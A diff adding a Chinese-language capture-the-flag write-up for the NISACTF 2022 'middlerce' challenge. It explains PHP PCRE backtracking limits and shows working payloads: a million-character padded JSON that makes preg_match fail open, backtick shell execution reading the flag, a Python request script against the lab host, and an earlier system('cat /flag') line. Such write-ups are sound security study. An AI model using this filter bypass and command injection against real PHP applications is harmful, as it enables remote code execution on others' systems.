@@ -10868,7 +10868,116 @@ echo $newfunc(2, M_E) . "\n";
 a=\create_function&b=;}system('cat /flag');//
 ```
 
+## [NISACTF 2022]middlerce
 
+### 1. PHP利用PCRE回溯次数限制绕过某些安全限制
+
+> 参考：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
+
+#### 1.1 正则表达式是什么
+
+正则表达式是一个可以被“有限状态自动机”接受的语言类。
+
+“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。
+
+而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：
+
+- DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入
+- NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态
+
+由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。
+
+#### 1.2 回溯的过程是怎样的
+
+```
+所以，我们题目中的正则<\?.*[(`;?>].*，假设匹配的输入是<?php phpinfo();//aaaaa，实际执行流程是这样的：
+```
+
+![image.png](https://www.leavesongs.com/media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png)
+
+这里直接套上图片来讲回溯过程，也可以参考P神的讲解；
+
+```
+空格匹配
+<匹配
+?匹配
+.*: .匹配除换行以外的所有字符，*匹配0次或多次；直接吃完所有字符
+[(`;?>]: 由于.*吃完了所有字符，导致[(`;?>]无法匹配到任何内容，开始回溯，.*开始往回吐字符a
+吐出一个字符a，还是匹配不到
+再吐一个字符a，还是匹配不到
+.......
+从后往前吐，直到吐出字符; [(`;?>] 成功匹配到内容
+剩下的//aaaaa 交由最后的.*匹配
+
+总结：
+正则为： <\?.*[(`;?>].*
+
+< 匹配 <
+? 匹配 ?
+.* 匹配 php phpinfo()
+[(`;?>] 匹配 ;
+.* 匹配 //aaaaa
+```
+
+上面整个过程中，往回吐出字符a的过程就被称为回溯，而PHP的回溯最大次数为一百万次，超过一百万次还没回溯完成就会返回False；以此就能绕过一些IF判断
+
+```php
+<?php
+var_dump(ini_get('pcre.backtrack_limit'));      // 1000000
+```
+
+### 2. CTF 题
+
+```php
+<?php
+include "check.php";
+if (isset($_REQUEST['letter'])){
+    $txw4ever = $_REQUEST['letter'];
+    if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
+        die("再加把油喔");
+    }
+    else{
+        $command = json_decode($txw4ever,true)['cmd'];
+        checkdata($command);
+        @eval($command);
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+综合上面的内容，这里就可以直接给出绕过if判断的payload；`.*`会在一开始吃掉整个JSON字符串，导致([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[)匹配不到任何内容，字符`@`就会被逐个吐出（回溯），当回溯次数超过1000000时，返回false
+
+```php
+<?php
+$data = json_encode(array('cmd' => 'cmd', 'preg' => str_repeat('@', 1000000)));
+$res = preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$data);
+var_dump($res);		// false
+```
+
+由于`check.php`过滤掉了`echo`和`_`导致无法回显，这里用`<?=?>`来代替`echo`（`<?=?>`自带一个`echo`）
+
+```php
+<?=123?>        // 输出123
+```
+
+综合下来，先用`?>`闭合上面的`<?`最后再用`<?=?>`得到flag即可
+
+```py
+import requests
+import json
+
+url = 'http://node4.anna.nssctf.cn:28041/'
+dict1 = {'cmd': '?><?=`tail /f*`?>', 'preg': ")" * 1000000}
+data = {
+    'letter': json.dumps(dict1)
+}
+
+req = requests.post(url, data=data)
+print(req.text)
+```
 
 
 
